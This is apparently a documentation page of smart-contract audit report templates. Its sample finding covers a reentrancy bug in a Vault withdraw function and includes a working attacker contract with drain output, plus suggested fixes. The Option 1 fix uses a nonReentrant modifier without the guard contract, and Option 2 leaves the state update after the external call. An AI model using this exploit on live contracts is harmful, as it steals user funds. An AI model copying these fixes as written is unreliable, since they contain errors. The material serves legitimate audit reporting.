# Reporting Standards

Security report templates and communication standards.
## Reporting Standards

### Executive Summary Template

```markdown
# Executive Summary

## Overview
[Project Name] engaged [Audit Firm] to conduct a security audit of their [Protocol Type] smart contracts. The audit was performed from [Start Date] to [End Date] by [Auditor Names].

## Scope
The audit covered the following contracts:
- Contract1.sol (XXX lines)
- Contract2.sol (XXX lines)
- Total: XXX lines of code

## Key Findings
- **Critical:** X findings
- **High:** X findings
- **Medium:** X findings
- **Low:** X findings
- **Informational:** X findings

## Critical Issues Summary
1. [Issue Title] - [One sentence description]
2. [Issue Title] - [One sentence description]

## Recommendations
1. Fix all Critical and High severity issues before deployment
2. Implement comprehensive testing for [specific areas]
3. Add monitoring for [specific events]
4. Consider [architectural improvements]

## Methodology
The audit employed a combination of:
- Automated analysis (Slither, Mythril, Aderyn)
- Manual code review
- Business logic verification
- Economic attack modeling
- Integration testing

## Conclusion
[Overall assessment of security posture and deployment readiness]
```

### Detailed Finding Template

```markdown
# [H-01] Reentrancy in withdraw function allows fund drainage

## Severity
High

## Description
The `withdraw()` function in `Vault.sol` makes an external call to transfer ETH before updating the user's balance. This violates the Checks-Effects-Interactions pattern and allows an attacker to recursively call `withdraw()` and drain the contract.

## Location
- **File:** `src/Vault.sol`
- **Function:** `withdraw()`
- **Lines:** 145-152

## Vulnerable Code
```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "No balance");

    // Vulnerable: External call before state update
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");

    // State update after external call
    balances[msg.sender] = 0;
}
```

## Impact
An attacker can drain all ETH from the contract through recursive calls. Given the contract currently holds $XXX worth of assets, this represents a complete loss of user funds.

**Attack Scenario:**
1. Attacker deposits 1 ETH
2. Attacker calls withdraw() through malicious contract
3. Malicious contract's receive() function recursively calls withdraw()
4. Process repeats until contract is drained

## Proof of Concept
```solidity
contract Attacker {
    Vault public vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        if (attackCount < 10 && address(vault).balance >= 1 ether) {
            attackCount++;
            vault.withdraw();
        }
    }
}
```

**Test Output:**
```
Vault balance before: 100 ETH
Attacker balance before: 1 ETH
[Executing attack...]
Vault balance after: 0 ETH
Attacker balance after: 101 ETH
```

## Recommendation

### Option 1: Follow CEI Pattern (Recommended)
```solidity
function withdraw() external nonReentrant {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "No balance");

    // Update state first
    balances[msg.sender] = 0;

    // External call last
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

### Option 2: Use ReentrancyGuard
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }
}
```

## References
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [ConsenSys Diligence: Reentrancy](https://consensysdiligence.github.io/smart-contract-best-practices/attacks/reentrancy/)
- [The DAO Hack](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao)

## Team Response
[Client's acknowledgment and remediation plan]

## Auditor Follow-up
[Verification of fix in retest]
```

